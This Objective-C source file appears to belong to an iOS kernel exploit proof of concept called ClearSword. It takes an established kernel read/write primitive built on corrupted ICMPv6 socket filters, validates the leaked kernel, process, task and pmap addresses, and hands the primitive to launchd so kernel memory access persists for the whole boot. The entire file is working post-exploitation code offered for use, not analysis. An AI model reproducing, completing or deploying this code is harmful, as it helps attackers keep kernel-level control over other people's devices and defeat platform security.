#import "persistence.h"

#import <Foundation/Foundation.h>
#import <netinet/icmp6.h>
#import <netinet/in.h>
#import <stdarg.h>
#import <string.h>
#import <sys/socket.h>

#import "common.h"
#import "kmem.h"
#import "krw.h"

extern int controlSocket;
extern int rwSocket;
extern uint64_t controlSocketPcb;
extern uint64_t rwSocketPcb;
extern uint64_t g_kernel_base;
extern uint64_t g_kernel_slide;
extern uint64_t gSelfProc;
extern uint64_t gSelfTask;

extern void offsets_init(void);
extern int srd_session_recover_only(void);
extern bool srd_kmem_ready(void);
extern bool srd_kmem_sockets_defunct_immune(void);
extern bool krw_persistence_transfer_to_launchd(void);

NSString* const kSettingsA18SessionPath = @"a18_session_path";
NSString* const kSettingsA18Interleave = @"a18_interleave";
NSString* const kSettingsA18MemoryShaping = @"a18_memory_shaping";
NSString* const kSettingsA18BoundedSearch = @"a18_bounded_search";

BOOL settings_krw_idle_detach_allowed(void) {
    return NO;
}

BOOL settings_krw_reattach_suppressed(void) {
    return NO;
}

BOOL log_verbose_enabled(void) {
    return NO;
}

// RemoteCall uses this only to print a diagnostic thread count. ClearSword
// does not carry SRD's optional task-layout calibration, so report unavailable.
int procmgr_task_thread_count_offset(void) {
    return -1;
}

void log_session_flush(void) {}
static void persistence_log(const char* prefix, const char* format, va_list args) {
    char message[1024];
    vsnprintf(message, sizeof(message), format, args);
    size_t length = strlen(message);
    while (length > 0 && (message[length - 1] == '\n' || message[length - 1] == '\r')) {
        message[--length] = '\0';
    }
    if (length != 0) poc_log(prefix, "%s", message);
}

void log_write(const char* message) {
    if (message == NULL) return;
    poc_log("[srd] ", "%.*s", (int)strcspn(message, "\r\n"), message);
}

void log_user(const char* format, ...) {
    va_list args;
    va_start(args, format);
    persistence_log("[srd] ", format, args);
    va_end(args);
}

static bool copy_srd_context(void) {
    if (controlSocket < 0 || rwSocket < 0 || !krw_is_kernel_address(controlSocketPcb) || !krw_is_kernel_address(rwSocketPcb) || !krw_is_kernel_address(g_kernel_base)) {
        return false;
    }

    uint8_t parked_filter[EARLY_KRW_LENGTH] = {};
    socklen_t length = sizeof(parked_filter);
    if (getsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, parked_filter, &length) != 0 || length < sizeof(parked_filter) || !krw_is_kernel_address(*(uint64_t*)parked_filter)) {
        return false;
    }

    g_ctx.control_socket = controlSocket;
    g_ctx.rw_socket = rwSocket;
    g_ctx.control_socket_pcb = controlSocketPcb;
    g_ctx.rw_socket_pcb = rwSocketPcb;
    memcpy(g_ctx.rw_filter_snapshot, parked_filter, sizeof(parked_filter));
    g_ctx.filter_snapshots_valid = true;
    g_ctx.transport_unsafe = true;
    g_ctx.kernel_base = g_kernel_base;
    g_ctx.kernel_slide = g_kernel_slide;
    g_ctx.self_proc = gSelfProc;
    g_ctx.self_task = gSelfTask;
    g_ctx.self_pmap = pmap_from_task(g_ctx.self_task);
    return krw_is_kernel_address(g_ctx.self_proc) && krw_is_kernel_address(g_ctx.self_task) && krw_is_kernel_address(g_ctx.self_pmap);
}

bool clearsword_persistence_recover(void) {
    if (srd_session_recover_only() != 0) return false;
    if (!copy_srd_context()) {
        LOG_ERR("persisted KRW context validation failed");
        return false;
    }
    LOG("recovered launchd-backed KRW for this boot");
    return true;
}

bool clearsword_persistence_save(void) {
    offsets_init();

    controlSocket = g_ctx.control_socket;
    rwSocket = g_ctx.rw_socket;
    controlSocketPcb = g_ctx.control_socket_pcb;
    rwSocketPcb = g_ctx.rw_socket_pcb;
    g_kernel_base = g_ctx.kernel_base;
    g_kernel_slide = g_ctx.kernel_slide;
    gSelfProc = g_ctx.self_proc;
    gSelfTask = g_ctx.self_task;

    if (!srd_kmem_ready() || !srd_kmem_sockets_defunct_immune() || !krw_persistence_transfer_to_launchd()) {
        LOG_ERR("launchd KRW persistence setup failed");
        return false;
    }
    LOG("KRW persisted in launchd for this boot");
    return true;
}
